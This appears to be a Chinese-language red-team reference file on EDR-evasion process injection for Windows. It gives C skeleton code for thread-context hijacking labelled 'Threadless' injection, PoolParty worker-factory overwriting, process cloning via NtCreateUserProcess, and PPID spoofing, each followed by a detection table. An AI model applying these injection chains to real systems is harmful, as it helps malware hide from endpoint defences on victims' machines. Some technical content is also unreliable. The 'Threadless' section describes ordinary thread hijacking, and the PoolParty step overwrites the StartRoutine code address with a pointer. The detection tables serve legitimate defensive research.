# 进程注入现代变体 — Threadless / PoolParty / Process Cloning

> 本文件补齐审计 **P0-5**：进程注入现代变体（2023-2024 主流 EDR 对抗技术）。
> 覆盖 **Threadless Injection（无线程跨进程写 RSP）→ PoolParty（线程池 worker factory 滥用）→
> Process Cloning（NtCreateUserProcess/PROCESS_CREATE_PROCESS_HANDLE）→ PPID 欺骗完整路线 →
> 检测侧（worker factory 遥测/异常栈/进程创建溯源）→ 实测判据** 四段。
> 授权立场见 `refs/README.md`；外部来源见审计 §5（RustSL-Syscall、PoolParty SafeBreach）。

## 0. 为什么需要「现代变体」

经典注入（CreateRemoteThread/APC/hollowing）都被 EDR 针对性监控：线程创建、跨进程写、RWX 分配、
映像卸载。现代变体的共同目标：**不创建线程、不复用「显式」执行原语、借系统合法机制（线程池/
进程创建）承载 payload**，让 EDR 的既有遥测点落空。

---

## 1. Threadless Injection（无线程注入）

### 1.1 原理

不调用 `CreateRemoteThread`/`NtCreateThreadEx`/APC。直接**改写目标进程某个已存在线程的上下文
（RIP/RSP）**，让该线程「自己」跳到 shellcode。关键技巧：把 shellcode 地址写入远端线程的
`RSP`（栈顶），配合 `SetThreadContext` 改 RIP，使线程恢复后自然执行 shellcode。

### 1.2 API 链（x64）

```c
// 骨架示例：Threadless Injection（改 RSP + RIP）
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid);
HANDLE hProc   = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid);

// 1) 挂起目标线程，抓上下文
SuspendThread(hThread);
CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_CONTROL;
GetThreadContext(hThread, &ctx);

// 2) 在目标进程分配可执行内存写 shellcode
LPVOID sc = VirtualAllocEx(hProc, NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
WriteProcessMemory(hProc, sc, shellcode, scLen, NULL);

// 3) 改写远端线程栈：把 shellcode 地址「压入」栈（RSP-8 写 sc 地址作为返回地址）
//    并把 RIP 指向 shellcode（或指向一个 ret gadget，让 ret 弹栈跳到 sc）
ULONG_PTR retAddr = (ULONG_PTR)sc;
WriteProcessMemory(hProc, (LPVOID)(ctx.Rsp - 8), &retAddr, sizeof(retAddr), NULL);
ctx.Rsp -= 8;
ctx.Rip = (DWORD64)sc;                       // 直接改 RIP 到 shellcode

// 4) 恢复线程
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);
```

**要点**：全程 `OpenThread`/`GetThreadContext`/`SetThreadContext`，无线程创建、无 APC、无映像操作。
「无线程」指不新增线程，复用现有线程。

### 1.3 检测侧

| 判据 | 遥测 |
|---|---|
| 远端线程 RIP 突变 | EDR 线程状态遥测（SetThreadContext 修改 RIP/RSP） |
| RSP 被跨进程写 | 跨进程写目标线程栈区（罕见正常行为） |
| 挂起→改上下文→恢复序列 | `SuspendThread` + `SetThreadContext` + `ResumeThread` 组合 |

---

## 2. PoolParty（线程池 worker factory 滥用，SafeBreach 2023）

### 2.1 原理

Windows 线程池（ThreadPool）用 `Worker Factory` 管理 worker 线程。`Worker Factory` 是内核对象
（`TpWorkerFactory`），含 **StartRoutine（工作线程起始函数）** 字段。攻击者经
`NtQueryInformationWorkerFactory` 定位远端进程的 worker factory，把 StartRoutine 覆写为 shellcode，
然后**提交一个工作项**（或插入到 worker 队列），worker 线程醒来就执行 shellcode——**不创建任何新线程**。

### 2.2 API 链（SafeBreach 公开思路 + 保守骨架）

```c
// 骨架示例：PoolParty 思路（版本相关结构，标注「骨架示例」）
// 1) 打开目标进程的 worker factory 句柄
//    （经 NtQueryInformationProcess / 枚举进程句柄表 / 或从线程池对象入手）
HANDLE hFactory = /* 定位目标进程 TpWorkerFactory 句柄 */;

// 2) 查询 worker factory 基本信息，拿到 StartRoutine 字段地址
WORKER_FACTORY_BASIC_INFORMATION wfbi = {0};
NtQueryInformationWorkerFactory(hFactory, WorkerFactoryBasicInformation, &wfbi, sizeof(wfbi), NULL);

// 3) 把 StartRoutine 覆写为远端 shellcode 地址
LPVOID sc = VirtualAllocEx(hProc, NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
WriteProcessMemory(hProc, sc, shellcode, scLen, NULL);
WriteProcessMemory(hProc, wfbi.StartRoutine, &sc, sizeof(sc), NULL);

// 4) 提交工作项触发 worker 执行 shellcode
//    （TpPostWork / NtSetInformationWorkerFactory / 直接写 work 队列）
```

**变体**（SafeBreach 命名族，已映射进知识库 T116-T123）：Remote TP Work/Timer/Wait/IO/ALPC/Job/
Direct 插入——载体不同，核心都是「改写 worker factory 承载路径 + 提交任务触发」。

### 2.3 检测侧

| 判据 | 遥测 |
|---|---|
| worker factory StartRoutine 被跨进程改 | `NtQueryInformationWorkerFactory` + 跨进程写 worker factory |
| worker 线程回调地址异常 | 线程池遥测看 worker 起始函数落在私有 RX |
| 无线程创建却执行 | 无 CreateRemoteThread 但线程池任务执行恶意代码 |

---

## 3. Process Cloning（进程克隆）

### 3.1 原理

`NtCreateUserProcess`（与 `NtCreateProcessEx` 同族）支持 **`PROCESS_CREATE_PROCESS_HANDLE`** 标志：
用另一个进程的句柄「克隆」其地址空间（section 映射），创建的新进程与父进程共享/复制映像，
但**绕过正常 `CreateProcess` 的映像验证与遥测路径**。攻击者借此让恶意进程「继承」合法进程的
内存布局（如挂起的合法进程被克隆后替换内存）。

### 3.2 API 链（骨架示例）

```c
// 骨架示例：NtCreateUserProcess + PROCESS_CREATE_PROCESS_HANDLE（克隆合法进程映像）
// 1) 打开一个合法进程句柄（克隆源）
HANDLE hSrc = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, legitPid);

// 2) 用 PROCESS_CREATE_PROCESS_HANDLE 标志创建新进程，克隆源进程的 section 映像
//    新进程地址空间与源进程同源（继承 PE section 映射）
NtCreateUserProcess(&hProc, &hThread, PROCESS_ALL_ACCESS, PROCESS_ALL_ACCESS,
                    NULL, NULL, 0, 0, NULL, NULL, NULL /*attr 含 clone 标志*/);
// 3) 在克隆出的进程中写入 shellcode / 覆写映像，再 SetThreadContext 执行
```

**`NtCreateProcessEx` 变体**：直接 `NtCreateSection`(SEC_IMAGE) + `NtCreateProcessEx`，以 section 创建进程，
绕过 `CreateProcess` 的映像文件路径遥测。

### 3.3 检测侧

| 判据 | 遥测 |
|---|---|
| 进程创建但无正常 4688 映像路径 | `NtCreateUserProcess`/`NtCreateProcessEx` 未走标准创建遥测 |
| 克隆源进程被打开 `PROCESS_CREATE_PROCESS` 权限 | 句柄权限异常（OpenProcess PROCESS_CREATE_PROCESS） |
| 新进程映像与磁盘不一致 | 内存映像 vs 磁盘哈希漂移 |

---

## 4. PPID 欺骗完整路线（父进程欺骗）

```c
// 完整路线（更新版，含 EXTENDED_STARTUPINFO_PRESENT）
SIZE_T sz = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &sz);
LPPROC_THREAD_ATTRIBUTE_LIST attr = HeapAlloc(GetProcessHeap(), 0, sz);
InitializeProcThreadAttributeList(attr, 1, 0, &sz);

HANDLE fakeParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                          &fakeParent, sizeof(fakeParent), NULL, NULL);

STARTUPINFOEXA si = {0}; si.lpAttributeList = attr; si.StartupInfo.cb = sizeof(si);
PROCESS_INFORMATION pi = {0};
CreateProcessA(NULL, cmd, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
               NULL, NULL, &si.StartupInfo, &pi);
```

**检测侧**：`4688` 父进程校验（声明父进程 PID ≠ 内核真实父进程 EPROCESS）；进程树异常（合法父进程
直接派生可疑子进程 + 网络外连）。

---

## 5. 检测侧总表（回馈 attack-defense）

| 技术 | 主检测点 | 遥测/Sigma |
|---|---|---|
| Threadless | SetThreadContext 改 RIP/RSP | 线程状态突变 + 跨进程写栈 |
| PoolParty | WorkerFactory StartRoutine 覆写 | `NtQueryInformationWorkerFactory` + 线程池遥测 |
| Process Cloning | NtCreateUserProcess/NtCreateProcessEx | 无标准 4688 + 句柄权限异常 |
| PPID 欺骗 | 4688 父进程 ≠ 真实父进程 | 进程创建溯源 + 进程树异常 |

## 6. 实测判据

| 判据 | 方法 |
|---|---|
| Threadless 是否无线程 | EDR/Process Monitor 观察无线程创建事件，但目标进程执行了 payload |
| PoolParty 是否复用 worker | 线程池遥测看 worker 起始函数落在私有 RX 且无新线程 |
| Cloning 是否绕过映像验证 | 进程存活但 `GetProcessImageFileName` 无正常映像路径 |

*WARNING: 授权红队评估与安全研究专用。*
